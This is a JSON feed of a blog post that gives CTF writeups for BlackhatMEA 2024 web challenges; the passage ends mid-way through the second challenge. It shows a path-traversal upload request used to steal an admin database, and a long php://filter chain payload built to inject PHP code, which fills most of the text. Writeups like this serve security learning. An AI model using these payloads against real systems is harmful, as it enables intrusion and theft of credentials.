{"version":"https://jsonfeed.org/version/1.1","title":"./khatta.sh | ⁄©⁄æÿßÿ™ÿß","home_page_url":"https://blog.shameerkashif.me","feed_url":"https://blog.shameerkashif.me/feed.json","description":"Khatta is a blog by hash3liZer. This blog is for articles regarding tech, CTFs, challenges, travelling and more.","icon":"https://blog.shameerkashif.me/assets/any@512.png","favicon":"https://blog.shameerkashif.me/favicon.png","authors":[{"name":"@hash3liZer","url":"https://blog.shameerkashif.me","avatar":"/assets/avatar.png"}],"language":"zh","hubs":[{"type":"WebSub","url":"https://pubsubhubbub.appspot.com"},{"type":"WebSub","url":"https://bridgy-fed.superfeedr.com"}],"items":[{"id":"blog/2024/blackhat-mea-24-qualifiers-web-writeups","url":"https://blog.shameerkashif.me/blog/2024/blackhat-mea-24-qualifiers-web-writeups","title":"BlackhatMEA 2024 CTF Writeups for all web challenges (Qualifiers)","content_html":"<h2 id=\"watermelon\"><a href=\"#watermelon\">Watermelon</a></h2><blockquote><p>All love for Watermelons üçâüçâüçâNote: The code provided is without jailing, please note that when writing exploits.</p></blockquote><p>Lets fire up the docker container and start reviewing the code. Seemed like a very minimilistic app with a few features to login/signup and then we can basically upload a file.Reviewing the file upload functionality, we know that it can‚Äôt be a shell since its Python and it wouldn‚Äôt make sense to do so. Lets have a close look:</p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" python=\"true\"><div class=\"language-id\">python</div><div class='code-container'><code><div class='line'>@app.route(\"/upload\", methods=[\"POST\"])</div><div class='line'>@login_required</div><div class='line'>def upload_file():</div><div class='line'>    if 'file' not in request.files:</div><div class='line'>        return jsonify(&#123;\"Error\": \"No file part\"&#125;), 400</div><div class='line'>    </div><div class='line'>    file = request.files['file']</div><div class='line'>    if file.filename == '':</div><div class='line'>        return jsonify(&#123;\"Error\": \"No selected file\"&#125;), 400</div><div class='line'>    </div><div class='line'>    user_id = session.get('user_id')</div><div class='line'>    if file:</div><div class='line'>        blocked = [\"proc\", \"self\", \"environ\", \"env\"]</div><div class='line'>        filename = file.filename</div><div class='line'></div><div class='line'>        if filename in blocked:</div><div class='line'>            return jsonify(&#123;\"Error\":\"Why?\"&#125;)</div><div class='line'></div><div class='line'>        user_dir = os.path.join(app.config['UPLOAD_FOLDER'], str(user_id))</div><div class='line'>        os.makedirs(user_dir, exist_ok=True)</div><div class='line'>        </div><div class='line'></div><div class='line'>        file_path = os.path.join(user_dir, filename)</div><div class='line'></div><div class='line'>        file.save(f\"&#123;user_dir&#125;/&#123;secure_filename(filename)&#125;\")</div><div class='line'>        </div><div class='line'></div><div class='line'>        new_file = File(filename=secure_filename(filename), filepath=file_path, user_id=user_id)</div><div class='line'>        db.session.add(new_file)</div><div class='line'>        db.session.commit()</div><div class='line'>        </div><div class='line'>        return jsonify(&#123;\"Message\": \"File uploaded successfully\", \"file_path\": file_path&#125;), 201</div><div class='line'></div><div class='line'>    return jsonify(&#123;\"Error\": \"File upload failed\"&#125;), 500</div></code></div></pre><!-- HTML_TAG_END --><p>The function <code>secure_filename</code> is being called whenever we are saving a file. But wait a sec, the variable <code>filepath</code> is insecure since the function is not called on this.Moreover the <code>filepath</code> variable is then stored into the database on the following line:</p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" python=\"true\"><div class=\"language-id\">python</div><div class='code-container'><code><div class='line'>new_file = File(filename=secure_filename(filename), filepath=file_path, user_id=user_id)</div></code></div></pre><!-- HTML_TAG_END --><p>This is enough to do directly traversal. After <code>register/login</code>, upload a file with a filename to access the <code>db.db</code> file which contains the <code>admin/password</code>: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\"><div class='code-container'><code><div class='line'>POST /upload HTTP/1.1</div><div class='line'>Host: localhost:5000</div><div class='line'>User-Agent: curl/8.7.1</div><div class='line'>Accept: */*</div><div class='line'>Cookie: session=eyJ1c2VyX2lkIjoyLCJ1c2VybmFtZSI6Imhhc2gifQ.ZtebRA.pzw2RU5bAOPlkusoTPCLzo747B0</div><div class='line'>Content-Length: 234</div><div class='line'>Content-Type: multipart/form-data; boundary=------------------------KjvLDRqPRA3nyLPTwyEEEd</div><div class='line'>Connection: keep-alive</div><div class='line'></div><div class='line'>--------------------------KjvLDRqPRA3nyLPTwyEEEd</div><div class='line'>Content-Disposition: form-data; name=\"file\"; filename=\"../../instance/db.db\"</div><div class='line'>Content-Type: application/octet-stream</div><div class='line'></div><div class='line'>hashish_lizer</div></code></div></pre><!-- HTML_TAG_END --><p><img src=\"https://github.com/user-attachments/assets/eb5f521a-ef2b-4b31-a4d6-baaa9326dc4f\" alt=\"image\" class=\"rounded-lg my-2\" loading=\"lazy\" decoding=\"async\"></p><p>Accessing the uploaded file, we have the <code>password</code> of admin:<img src=\"https://github.com/user-attachments/assets/5c656ab5-a6fa-4afb-b4bf-5d479cc5e487\" alt=\"image\" class=\"rounded-lg my-2\" loading=\"lazy\" decoding=\"async\"></p><p>Login with the <code>user/pass</code> and get the hash at <code>/admin</code> endpoint. </p><h2 id=\"free-flag\"><a href=\"#free-flag\">Free Flag</a></h2><blockquote><p>Free Free</p></blockquote><p>Download the source code and started a local container. Reviewing the source code, we have a very simple <code>PHP</code> to give filename that can be accessed on the local system: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" php=\"true\"><div class=\"language-id\">php</div><div class='code-container'><code><div class='line'>if(isset($_POST['file']))</div><div class='line'>&#123;</div><div class='line'>    if(isRateLimited())</div><div class='line'>    &#123;</div><div class='line'>        die(\"Limited 1 req per second\");</div><div class='line'>    &#125;</div><div class='line'>    $file = $_POST['file'];</div><div class='line'>    if(substr(file_get_contents($file),0,5) !== \"&lt;?php\" && substr(file_get_contents($file),0,5) !== \"&lt;html\") # i will let you only read my source haha</div><div class='line'>    &#123;</div><div class='line'>        die(\"catched\");</div><div class='line'>    &#125;</div><div class='line'>    else</div><div class='line'>    &#123;</div><div class='line'>        echo file_get_contents($file);</div><div class='line'>    &#125;</div><div class='line'>&#125;</div></code></div></pre><!-- HTML_TAG_END --><p>But the catch here we can only get the file data when the file starts with either <code>&lt;?php</code> or <code>&lt;html</code>. Hence, we can‚Äôt simply request the <code>/flag.txt</code> file.And the function <code>file_get_contents</code> only returns back the data inside file unlike <code>include</code> which executes the data. So, we need a way to bypass the line:</p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" php=\"true\"><div class=\"language-id\">php</div><div class='code-container'><code><div class='line'>if(substr(file_get_contents($file),0,5) !== \"&lt;?php\" && substr(file_get_contents($file),0,5) !== \"&lt;html\")</div></code></div></pre><!-- HTML_TAG_END --><p>In <code>PHP</code> we have URI schemes like <code>php://input</code> or <code>php://filter</code>. My initial payload was to set the filename as <code>php://input</code> and read data from the raw <code>POST</code> request.But that wouldn‚Äôt work because we can only read data from the POST and not a file:</p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" php=\"true\"><div class=\"language-id\">php</div><div class='code-container'><code><div class='line'>&lt;?php something&file=php://input</div></code></div></pre><!-- HTML_TAG_END --><p><img src=\"https://github.com/user-attachments/assets/0fdd669c-f615-4b5a-b42c-1d3e0679379a\" alt=\"image\" class=\"rounded-lg my-2\" loading=\"lazy\" decoding=\"async\"></p><p>Now, digging and looking at my notes. We have a way to inject PHP code from url using <code>php://filter</code> chain. We can generate a chain with this tool here:<a href=\"https://github.com/synacktiv/php_filter_chain_generator\" rel=\"nofollow noopener noreferrer external\" target=\"_blank\">https://github.com/synacktiv/php_filter_chain_generator</a></p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" bash=\"true\"><div class=\"language-id\">bash</div><div class='code-container'><code><div class='line'>python3 php_filter_chain_generator.py --chain '&lt;?php ...payloadhere; ?&gt;  '</div></code></div></pre><!-- HTML_TAG_END --><p>My final payload looked like:</p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" php=\"true\"><div class=\"language-id\">php</div><div class='code-container'><code><div class='line'>php://filter/convert.base64-encode|convert.base64-encode|convert.iconv.855.UTF7|convert.base64-encode|convert.iconv.855.UTF7|convert.base64-encode|convert.iconv.855.UTF7|convert.base64-decode|convert.iconv.855.UTF7|convert.base64-decode|convert.iconv.855.UTF7|convert.base64-decode|convert.iconv.855.UTF7|convert.base64-decode|convert.quoted-printable-encode|convert.base64-encode|convert.base64-encode|convert.base64-encode|convert.quoted-printable-encode|convert.iconv.855.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.quoted-printable-encode|convert.iconv.855.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.quoted-printable-encode|convert.iconv.855.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.base64-decode|convert.iconv.437.UCS-4le|convert.base64-encode|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.base64-decode|convert.iconv.UCS-4.UCS-4LE|convert.base64-encode|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.base64-decode|convert.iconv.UCS-4.UCS-4LE|convert.base64-encode|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.base64-decode|convert.iconv.UCS-4.UCS-4LE|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.base64-decode|convert.iconv.UCS-4.UCS-4LE|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.base64-decode|convert.iconv.UCS-4.UCS-4LE|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.base64-decode|convert.iconv.UCS-4.UCS-4LE|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.base64-decode|convert.iconv.UCS-4.UCS-4LE|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.base64-decode|convert.iconv.UCS-4.UCS-4LE|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.base64-decode|convert.iconv.UCS-4.UCS-4LE|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.base64-decode|convert.iconv.UCS-4.UCS-4LE|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.base64-decode|convert.iconv.UCS-4.UCS-4LE|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.base64-decode|convert.iconv.UCS-4.UCS-4LE|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.base64-decode|convert.iconv.UCS-4.UCS-4LE|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.base64-decode|convert.iconv.UCS-4.UCS-4LE|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.base64-decode|convert.iconv.UCS-4.UCS-4LE|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.base64-decode|convert.iconv.UCS-4.UCS-4LE|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.base64-decode|convert.iconv.UCS-4.UCS-4LE|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.base64-decode|convert.iconv.UCS-4.UCS-4LE|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.base64-decode|convert.iconv.UCS-4.UCS-4LE|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.base64-decode|convert.iconv.UCS-4.UCS-4LE|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.base64-decode|convert.iconv.UCS-4.UCS-4LE|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.base64-decode|convert.iconv.UCS-4.UCS-4LE|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.base64-decode|convert.iconv.UCS-4.UCS-4LE|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.base64-decode|convert.iconv.UCS-4.UCS-4LE|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.base64-decode|convert.iconv.UCS-4.UCS-4LE|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.base64-decode|convert.iconv.UCS-4.UCS-4LE|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.base64-decode|convert.iconv.UCS-4.UCS-4LE|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.base64-decode|convert.iconv.UCS-4.UCS-4LE|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.base64-decode|convert.iconv.UCS-4.UCS-4LE|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.base64-decode|convert.iconv.UCS-4.UCS-4LE|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.base64-decode|convert.iconv.UCS-4.UCS-4LE|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.base64-decode|convert.iconv.UCS-4.UCS-4LE|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.base64-decode|convert.iconv.UCS-4.UCS-4LE|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.base64-decode|convert.iconv.UCS-4.UCS-4LE|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.base64-decode|convert.iconv.UCS-4.UCS-4LE|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.base64-decode|convert.iconv.UCS-4.UCS-4LE|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.base64-decode|convert.iconv.UCS-4.UCS-4LE|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.base64-decode|convert.iconv.UCS-4.UCS-4LE|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.base64-decode|convert.iconv.UCS-4.UCS-4LE|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.base64-decode|convert.iconv.UCS-4.UCS-4LE|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.base64-decode|convert.iconv.UCS-4.UCS-4LE|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.base64-decode|convert.iconv.UCS-4.UCS-4LE|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.base64-decode|convert.iconv.UCS-4.UCS-4LE|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.base64-decode|convert.iconv.UCS-4.UCS-4LE|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.base64-decode|convert.iconv.UCS-4.UCS-4LE|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.base64-decode|convert.iconv.UCS-4.UCS-4LE|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.base64-decode|convert.iconv.UCS-4.UCS-4LE|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.base64-decode|convert.iconv.UCS-4.UCS-4LE|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.base64-decode|convert.iconv.UCS-4.UCS-4LE|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|co